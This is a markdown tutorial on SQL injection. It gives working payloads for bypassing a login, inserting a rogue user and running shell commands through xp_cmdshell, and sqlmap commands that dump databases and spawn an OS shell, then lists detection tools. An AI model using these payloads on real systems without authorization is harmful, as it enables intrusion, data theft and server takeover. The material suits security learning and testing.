# SQL INJECTION
### SQL INJECTION IS OF 3 MAIN TYPES:
* In-band SQLi: attacker uses the same communication channel to perform the attack and retrieve the results
* Blind/inferential SQLi: attacker has no error messages from the system with which to work, but rather simply sends a malicious SQL query to the database
* Out-of-band SQL injection: attacker uses different communication channels (such as database email functionality, or file writing and loading functions) to perform the attack and obtain the results

### USES OF SQLi ATTACK
* Authentication and authorisation bypass
* Information disclosure
* data integrity compromise
* data availability compromise
* Remote Code execution (RCE)

## PERFORMING SQL INJECTION
### BLIND SQLi
we enter a malicious SQL query along with some characters to handle the syntax of the server's code. for example:<br>
```1' or 1=1 --```<br>
![image](https://user-images.githubusercontent.com/56624593/151232264-d9dcd6b9-0205-4a89-b7cd-24205b761c0d.png)<br>
after we hit enter, we can see that we have succesfully logged in.<br>
![image](https://user-images.githubusercontent.com/56624593/151232426-d67c0af8-5640-480b-860b-efc1d9a8270a.png)<br>
we can similarly write a malicious SQL query to create a new user in the database<br>
```1';insert into login values ('johndoe','password'); --```<br>
![image](https://user-images.githubusercontent.com/56624593/151233357-255ec6f9-d5de-4283-96b0-c2f8e6b7fdf8.png)<br>
the new user named johndoe with password as password has been created<br>

### RCE USING SQLi
shell code can be executed on a server that is vulnerable to SQLi <br>
eg:<br>
```1';exec master..xp_cmdshell '<shell command>'; --```<br>
![image](https://user-images.githubusercontent.com/56624593/151235445-9e09e104-344a-402f-8de2-44e05a0f0660.png)<br>
the shell command that is in the SQL query will be executed on the victim server

##SQLi USING SQLMAP
SQLmap is an open source penetration testing tool that is used to test and exploit database servers for SQL injection vulnerabilities.<br>
### sample command to enumerate databases on the server:<br>
```sqlmap -u "<path to the webpage to be tested>" --dbs```<br>
![image](https://user-images.githubusercontent.com/56624593/151587015-afac5eae-4dc0-4598-97e9-4d25164c037f.png)<br><br>
![image](https://user-images.githubusercontent.com/56624593/151587167-08bfaa0e-ae2e-435b-a1d4-49c578c0f290.png)<br>

### sample command to extract tables from a specific database from a vulnerable server:<br>
```sqlmap -u "<path to the webpage to be tested>" -D <database> --tables```<br>
![image](https://user-images.githubusercontent.com/56624593/151587548-ceb35020-5f94-4c15-963d-38f8d508b435.png)<br>

### sample command to extract the contents of a specific table from a database:<br>
```sqlmap -u "<path to the webpage to be tested>" -D <database> -T <table name> --dump```<br>
![image](https://user-images.githubusercontent.com/56624593/151587828-ac885763-968c-4e2e-96bf-ef2fd515cd76.png)<br>

### sample command to spawn a shell on the server using SQLi:<br>
```sqlmap -u "<path to the webpage to be tested>" --os-shell```<br>
![image](https://user-images.githubusercontent.com/56624593/151588160-70d152c5-5e5b-4e46-8ea0-407dda577ca2.png)<br>
now we can run any command we want on the victim system. we can also escalate our privileges to gain complete control over the victim system.


## DETECTING SQLi
There are several tools that can be used to detect SQL injections. eg. SQLmap, DSSS and OWASP ZAP<br>
### use DSSS:<br>
(in the DSSS directory) ```python3 dsss.py -u "<path to the webpage to be tested>"<br>```
![image](https://user-images.githubusercontent.com/56624593/151591106-46590e96-8507-42c2-bb64-4c55bd67fb3a.png)<br>

### use OWASP ZAP:
Owasp ZAP is a huge tool that is capable of doing automated vulnerability assessments of websites on its own. it can test websites for most vulnerabilities, and give them scores according to their severity. It can also generate assessment reports in various formats.
